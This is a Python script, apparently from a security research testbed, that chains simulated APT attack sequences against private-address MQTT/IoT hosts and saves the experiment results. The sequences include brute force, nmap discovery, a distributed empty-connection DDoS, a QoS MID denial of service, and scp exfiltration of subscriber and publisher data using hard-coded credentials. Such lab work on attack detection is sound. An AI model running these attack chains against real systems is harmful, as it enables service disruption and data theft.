import APT
# we give a new input list
exp_details = []

# an attack sequence
attack_seq1 = [(APT.NetstatStep(), 1), (APT.PauseStep(10),),
               (APT.BruteForceStep(),), (APT.NmapSubDiscStep("10.0.0.13"),), (APT.PauseStep(20),),
               (APT.DistributedExploit(["10.0.0.12", "10.0.0.13"], 2,
                                       APT.EmptyConnExploit("10.0.0.12", "client1", "pass1")),)]

# we then create the attack, run it and save the results in a specified file path
attack = APT.APTAttack(attack_seq1, "empty_conn_ddos", exp_details, "./output/experiment_details.pkl")
exp_details = attack.run()
attack.save_in()

# implementation of another attack path
attack_seq2 = [(APT.NetstatStep(5),), (APT.PauseStep(10),), (APT.Nmap10T4Step(),),
               (APT.BruteForceStep(),),
               (APT.MqttCatDiscStep("10.0.0.10"),), (APT.QOSMIDExploit("10.0.0.10", "client1", "pass1"), 10)]
# we reuse the exp details list to append the new data
attack = APT.APTAttack(attack_seq2, "qos_mid_dos", exp_details, "./output/experiment_details.pkl")
exp_details = attack.run()
# and save it in the same file
attack.save_in()

# and example of exfiltration attack from subscriber
attack_seq3 = [(APT.NetstatStep(),), (APT.BruteForceStep(),),
               (APT.MqttCatDiscStep("10.0.0.20"),), (APT.ScpExfiltrateStep("10.0.0.20", src_file="/sub_output"), 10)]
attack = APT.APTAttack(attack_seq3, "sub_exf", exp_details, "./output/experiment_details.pkl")
exp_details = attack.run()
attack.save_in()

# an example of exfiltration attack from publisher
attack_seq4 = [(APT.BruteForceStep(), 3), (APT.MqttCatDiscStep("10.0.0.5"),),
               (APT.PubExfExploit("10.0.0.5", "client1", "pass1", ["Building4/SolarPower/Voltage"], duration=30),),
               (APT.ScpExfiltrateStep("10.0.0.20",src_file="/to_be_exfiltrated_pub"), 10)]
attack = APT.APTAttack(attack_seq4, "pub_exf", exp_details, "./output/experiment_details.pkl")
exp_details = attack.run()
attack.save_in()
